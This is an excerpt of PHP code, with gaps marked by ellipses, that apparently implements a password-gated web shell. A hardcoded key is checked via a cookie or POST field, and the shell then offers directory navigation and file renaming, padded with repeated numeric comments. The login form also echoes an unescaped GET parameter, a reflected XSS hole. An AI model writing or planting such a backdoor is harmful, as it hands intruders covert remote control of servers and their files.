...
$auth_key = "247a4a77381ec2f302cb8879f7dd8063";
...
$pass = false;
if (isset($_COOKIE['pw_name_20633'])) {
    if(($_COOKIE['pw_name_20633']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_20633'])) {
        if(($_POST['pw_name_20633']) == $auth_key) {
            setcookie("pw_name_20633", $_POST['pw_name_20633']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_20633' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724682774700172 1724682774624840 1724682774705931 1724682774649133
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724682774700172 1724682774624840 1724682774705931 1724682774649133
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724682774700172 1724682774624840 1724682774705931 1724682774649133
            $name = PATH . "/" . $_GET['r'];
